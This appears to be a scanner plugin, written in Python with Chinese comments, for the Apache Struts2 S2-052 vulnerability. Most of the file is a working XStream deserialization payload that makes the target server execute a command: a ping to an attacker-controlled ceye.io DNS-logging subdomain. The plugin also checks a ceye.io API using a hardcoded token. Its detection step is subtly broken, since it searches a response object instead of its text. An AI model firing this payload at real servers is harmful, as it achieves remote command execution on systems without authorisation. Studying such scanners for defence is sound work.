#!/usr/bin/env python
# _*_ coding: utf-8 _*_
import urllib
import requests
import time

import logging
import ClassCongregation
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2019-10-13"  # 插件编辑时间
        self.info['algroup'] = "S2_052"  # 插件名称
        self.info['name'] ='Struts2远程代码执行漏洞' #漏洞名称
        self.info['affects'] = "Struts2"  # 漏洞组件
        self.info['desc_content'] = ""  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['details'] = Medusa  # 结果

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    payload_url = scheme+"://"+url+':'+str(port)+'/orders/3/edit'
    host=url+':'+str(port)
    payload = '''
    <map>
      <entry>
        <jdk.nashorn.internal.objects.NativeString>
          <flags>0</flags>
          <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
            <dataHandler>
              <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
                <is class="javax.crypto.CipherInputStream">
                  <cipher class="javax.crypto.NullCipher">
                    <initialized>false</initialized>
                    <opmode>0</opmode>
                    <serviceIterator class="javax.imageio.spi.FilterIterator">
                      <iter class="javax.imageio.spi.FilterIterator">
                        <iter class="java.util.Collections$EmptyIterator"/>
                        <next class="java.lang.ProcessBuilder">
                          <command>
                            <string>ping</string>
                            <string>{}.S2052.7ktb2x.ceye.io</string>
                          </command>
                          <redirectErrorStream>false</redirectErrorStream>
                        </next>
                      </iter>
                      <filter class="javax.imageio.ImageIO$ContainsFilter">
                        <method>
                          <class>java.lang.ProcessBuilder</class>
                          <name>start</name>
                          <parameter-types/>
                        </method>
                        <name>foo</name>
                      </filter>
                      <next class="string">foo</next>
                    </serviceIterator>
                    <lock/>
                  </cipher>
                  <input class="java.lang.ProcessBuilder$NullInputStream"/>
                  <ibuffer></ibuffer>
                  <done>false</done>
                  <ostart>0</ostart>
                  <ofinish>0</ofinish>
                  <closed>false</closed>
                </is>
                <consumed>false</consumed>
              </dataSource>
              <transferFlavors/>
            </dataHandler>
            <dataLen>0</dataLen>
          </value>
        </jdk.nashorn.internal.objects.NativeString>
        <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
      </entry>
      <entry>
        <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
        <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
      </entry>
    </map>
    '''.format(url)
    headers = {
        'Host':host,
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': RandomAgent,
        'Connection': 'close',
        'Content-Type': 'application/xml',

    }
    s = requests.session()
    try:
        if ProxyIp != None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }

            resp = s.post(payload_url, data=payload, headers=headers,proxies=proxies, timeout=5, verify=False)
        elif ProxyIp == None:
            resp = s.post(payload_url, data=payload,headers=headers, timeout=5, verify=False)
        ceyeurl = 'http://api.ceye.io/v1/records?token=f84734983a259c598a1edeb772981d14&type=dns&filter='
        time.sleep(5)
        ceye_content = requests.get(ceyeurl, timeout=3)
        flag = "{}.S2052".format(url)
        if flag in ceye_content:
            Medusa = "{}\r\n漏洞详情:\r\n影响版本:Struts2_1_2-Struts2_3_33,Struts2_5-Struts2_5_12\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,payload)
            _t = VulnerabilityInfo(Medusa)
            web = ClassCongregation.VulnerabilityDetails(_t.info)
            web.High()  # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
            return (_t.info)
    except:
        _ = VulnerabilityInfo('').info.get('algroup')
        _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类